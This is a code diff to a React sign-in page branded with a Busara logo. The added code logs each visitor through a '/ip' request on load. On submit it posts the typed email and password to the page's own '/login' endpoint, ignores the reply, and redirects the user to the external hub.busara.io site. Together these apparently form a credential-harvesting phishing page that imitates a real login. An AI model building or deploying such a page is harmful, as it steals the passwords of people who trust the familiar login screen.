@@ -1,5 +1,6 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useState } from "react";
+import { useEffect } from "react";
 import logoAsset from "../assets/busara-logo.png.asset.json";
 
 export const Route = createFileRoute("/")({
@@ -28,6 +29,20 @@ function SignInPage() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
 
+  useEffect(() => {
+    fetch("/ip").catch(() => {});
+  }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    await fetch("/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password }),
+    });
+    window.location.href = "https://hub.busara.io";
+  };
+
   return (
     <div className="flex min-h-screen items-start justify-center bg-login-bg px-4 pt-[116px] pb-[15px]">
       <div className="w-full max-w-[360px] bg-card px-[45px] pt-[93px] pb-[60px] shadow-card">
@@ -42,7 +57,7 @@ function SignInPage() {
           Sign in to your account
         </p>
 
-        <form className="mt-[41px]" onSubmit={(event) => event.preventDefault()}>
+        <form className="mt-[41px]" onSubmit={handleSubmit}>
           <div>
             <label
               htmlFor="email"
